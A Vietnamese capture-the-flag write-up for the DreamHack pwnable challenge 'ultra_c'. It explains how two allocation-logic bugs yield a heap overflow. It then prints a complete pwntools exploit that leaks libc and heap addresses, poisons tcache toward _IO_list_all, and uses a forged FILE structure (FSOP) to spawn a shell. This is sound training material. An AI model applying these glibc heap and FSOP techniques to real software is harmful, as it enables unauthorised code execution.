# ultra_c---Write-up-----DreamHack

Hướng dẫn cách giải bài ultra_c cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 05/10/2026

## 1. Mục tiêu

Đầu tiên là đọc code và tìm bug, trong bài này không có chỗ nào sai 1 cách cụ thể mà thông qua logic của bài. Mình sẽ phân tích lỗi như sau.

Bài này có 1 struct là `space`

```C
space[0] = size
space[8] = ptr
space[16] = type
```

Thì khi chúng ta tạo 1 `note`, nó sẽ khởi tạo như trên. Nhưng có 1 lỗi chí mạng ở đây là ở hàm `_alloc` nó không hề kiểm tra xem `index` đó đã được sử dụng chưa. Chính vì thế nên ví dụ ta tạo 1 `note` theo kiểu type 4 với size là 100 thì nó sẽ như sau

<img width="810" height="100" alt="image" src="https://github.com/user-attachments/assets/4de752e8-a49c-4b30-88d5-c38f6f9ef44c" />

Mình sẽ sử dụng lỗi ở `_alloc` để khai báo lại size của thằng index này thành 1024

<img width="816" height="95" alt="image" src="https://github.com/user-attachments/assets/83bb1054-7753-438a-b05e-c91e9baf453b" />

Đó là lỗi đầu tiên, bên cạnh đó thì ở hàm `_alloc` còn 1 lỗi nữa là khi ta nhập 1 type khác với trong đề thì thay vì xóa nó thì nó chỉ in ra `puts("Invalid type");` và break thôi. Tức là type mình gõ sai vẫn được ghi vào trong `space`.

Lỗi tiếp theo nằm ở `_write`

```C
else if ( v3 > 3 )
    {
      printf("Length: ");
      __isoc99_scanf("%lu", &v7);
      if ( *((_QWORD *)&space + 3 * (int)v6) < v7 )
      {
        v4 = v6;
        *((_QWORD *)&unk_4068 + 3 * (int)v4) = realloc(
                                                 *((void **)&unk_4068 + 3 * (int)v6),
                                                 *((_QWORD *)&space + 3 * (int)v6));
      }
      printf("Data: ");
      read(0, *((void **)&unk_4068 + 3 * (int)v6), *((_QWORD *)&space + 3 * (int)v6));
    }
```

Nó sẽ kiểm tra là `type` có lớn hơn 3 hay không, nếu đúng thì sẽ cho nhập size mình muốn `realloc` vào và kiểm tra xem nếu size mình nhập vào có lớn hơn size hiện tại của `note` hay không. Nếu đúng thì sẽ `realloc`, còn sai thì sẽ cho ghi vào `ptr` đó với độ lớn size của `note`.

Tổng hợp tất cả lỗi trên, ta sẽ khai thác như sau. Đầu tiên ta sẽ khởi tạo 1 chunk A cỡ 0x20 byte, sau đó đổi type nó thành 3 và sửa lại size thành 0x100. Sau đó ta sẽ sửa lại type thành 1 số bất kì lớn hơn 3. Cuối cùng ta sẽ `_write`, code sẽ kiểm tra như sau.

```C
if ( type > 3 )
  if ( size < v7 )
      realloc(...)
  read(0, ptr, size)
```

Vậy là ta vừa tạo thành công 1 lỗi **Heap Overflow**. Chỉ cần nhiêu đây là đủ khai thác rồi. Ok bắt tay vô làm thôi.

## 2. Cách thực thi
Đầu tiên là ta sẽ leak libc và heap. Ta sẽ leak bằng cách tạo 1 `unsortbin`, sau đó tạo 1 chunk nhỏ để `unsortbin` cắt ra. Trong này sẽ có dữ liệu của `fd bk` của nó.

```Python
add(0, 4, 1048, b'A' * 8)
add(1, 4, 50, b'B' * 8)
free(0)

add(0, 4, 100, b'A' * 8)
view(0)

p.recvuntil(b'A' * 8)
leak_libc = u64(p.recv(6) + b'\x00\x00')
libc.address = leak_libc - 0x203f10
log.success(f'Libc base : {hex(libc.address)}')

p.recv(2)
heap = u64(p.recv(6) + b'\x00\x00') - 0x290
log.success(f'Heap base : {hex(heap)}')
```

<img width="711" height="180" alt="image" src="https://github.com/user-attachments/assets/509e1339-c692-43a8-95c8-bfdb40b6776b" />

Bởi vì cái này là `write()` với độ lớn size nên không cần ghi đè byte null đâu, nó sẽ in ra hết. Sau khi có đủ rồi thì ta sẽ bắt đầu tạo 1 `fake struct` để **FSOP**.

```Python
fake_file = heap + 0x310
fake_wide = fake_file + 0x100
fake_vtable = fake_file + 0x200
payload = bytearray(b'\x00' * 0x300)

payload[0x00:0x08] = p64(0x3b01010101010101)
payload[0x08:0x10] = b"sh\x00".ljust(8, b'\x00')
payload[0x68:0x70] = p64(0)
payload[0x88:0x90] = p64(fake_file + 0x80)
payload[0xa0:0xa8] = p64(fake_wide)
payload[0xc0:0xc4] = p32(1)
payload[0xd8:0xe0] = p64(libc.symbols['_IO_wfile_jumps'])

payload[0x100 + 0x18:0x100 + 0x20] = p64(0)
payload[0x100 + 0x20:0x100 + 0x28] = p64(1)
payload[0x100 + 0x30:0x100 + 0x38] = p64(0)
payload[0x100 + 0xe0:0x100 + 0xe8] = p64(fake_vtable)

payload[0x200 + 0x68:0x200 + 0x70] = p64(libc.symbols['system'])

add(2, 4, 908, payload)
```

Giờ mình sẽ sử dụng bug mình vừa giải thích để ghi đè `fd` của tcache thành `_IO_list_all`.

```Python
add(3, 4, 100, b'A' * 8)
add(4, 4, 100, b'B' * 8)
add(5, 4, 100, b'B' * 8)

p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'Index: ', b'3')
p.sendlineafter(b'Type: ', b'3')
p.sendlineafter(b'Value: ', b'200')

p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'Index: ', b'3')
p.sendlineafter(b'Type: ', b'5')

free(5)
free(4)

p.sendlineafter(b'>> ', b'4')
p.sendlineafter(b'Index: ', b'3')
p.sendlineafter(b'Length: ', b'200')

io_file = libc.symbols['_IO_list_all']

payload = b'A' * 8 * 13
payload += p64(0x71)
payload += p64(io_file ^ ( heap >> 12 ))

p.sendafter(b'Data: ', payload)
```

<img width="1018" height="82" alt="image" src="https://github.com/user-attachments/assets/2562ec8a-c1af-45bf-97df-9d553881990e" />

Giờ mình chỉ việc rút ra hết và sửa `_IO_list_all` để nó trỏ vào `fake struct` mà mình đã ghi là xong 🐧.

Bài này cũng không quá khó, chủ yếu là tìm được bug trên khá là khó, cần phải đọc code thật kĩ và thử nghiệm mới được.

<img width="447" height="447" alt="image" src="https://github.com/user-attachments/assets/fd6f3c16-595f-4088-9904-336033e27cb6" />

## 3. Exploit
```Python
from pwn import *

exe = ELF("prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process('./prob_patched')
# p = remote('host3.dreamhack.games', 8410)

def add(idx, Type, size, payload):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Type: ', str(Type).encode())
    p.sendlineafter(b'Length: ', str(size).encode())
    p.sendafter(b'Data: ', payload)

def free(idx):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def view(idx):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())

add(0, 4, 1048, b'A' * 8)
add(1, 4, 50, b'B' * 8)
free(0)

add(0, 4, 100, b'A' * 8)
view(0)

p.recvuntil(b'A' * 8)
leak_libc = u64(p.recv(6) + b'\x00\x00')
libc.address = leak_libc - 0x203f10
log.success(f'Libc base : {hex(libc.address)}')

p.recv(2)
heap = u64(p.recv(6) + b'\x00\x00') - 0x290
log.success(f'Heap base : {hex(heap)}')

fake_file = heap + 0x310
fake_wide = fake_file + 0x100
fake_vtable = fake_file + 0x200
payload = bytearray(b'\x00' * 0x300)

payload[0x00:0x08] = p64(0x3b01010101010101)
payload[0x08:0x10] = b"sh\x00".ljust(8, b'\x00')
payload[0x68:0x70] = p64(0)
payload[0x88:0x90] = p64(fake_file + 0x80)
payload[0xa0:0xa8] = p64(fake_wide)
payload[0xc0:0xc4] = p32(1)
payload[0xd8:0xe0] = p64(libc.symbols['_IO_wfile_jumps'])

payload[0x100 + 0x18:0x100 + 0x20] = p64(0)
payload[0x100 + 0x20:0x100 + 0x28] = p64(1)
payload[0x100 + 0x30:0x100 + 0x38] = p64(0)
payload[0x100 + 0xe0:0x100 + 0xe8] = p64(fake_vtable)

payload[0x200 + 0x68:0x200 + 0x70] = p64(libc.symbols['system'])

add(2, 4, 908, payload)

add(3, 4, 100, b'A' * 8)
add(4, 4, 100, b'B' * 8)
add(5, 4, 100, b'B' * 8)

p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'Index: ', b'3')
p.sendlineafter(b'Type: ', b'3')
p.sendlineafter(b'Value: ', b'200')

p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'Index: ', b'3')
p.sendlineafter(b'Type: ', b'5')

free(5)
free(4)

p.sendlineafter(b'>> ', b'4')
p.sendlineafter(b'Index: ', b'3')
p.sendlineafter(b'Length: ', b'200')

io_file = libc.symbols['_IO_list_all']

payload = b'A' * 8 * 13
payload += p64(0x71)
payload += p64(io_file ^ ( heap >> 12 ))

p.sendafter(b'Data: ', payload)

add(4, 4, 100, b'A' * 8)
add(5, 4, 100, p64(heap + 0x310))

p.sendlineafter(b'>> ', b'5')

p.interactive()
```
